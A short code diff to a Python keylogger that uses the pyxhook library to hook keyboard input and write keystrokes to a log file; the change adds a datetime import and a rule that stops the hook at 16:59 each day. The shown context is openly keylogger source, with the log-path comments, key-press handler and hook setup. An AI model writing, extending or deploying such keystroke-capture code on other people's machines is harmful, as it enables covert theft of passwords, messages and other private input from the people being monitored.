@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 import os
 import pyxhook
+import datetime
 
 # This tells the keylogger where the log file will go.
 # You can set the file path as an environment variable ('pylogger_file'),
@@ -32,7 +33,8 @@ def OnKeyPress(event):
 
     if event.Ascii == cancel_key:
         new_hook.cancel()
-
+    if (datetime.datetime.now().hour == 16 and datetime.datetime.now().minute == 59):
+        new_hook.cancel()
 new_hook = pyxhook.HookManager()
 new_hook.KeyDown = OnKeyPress
 new_hook.HookKeyboard()
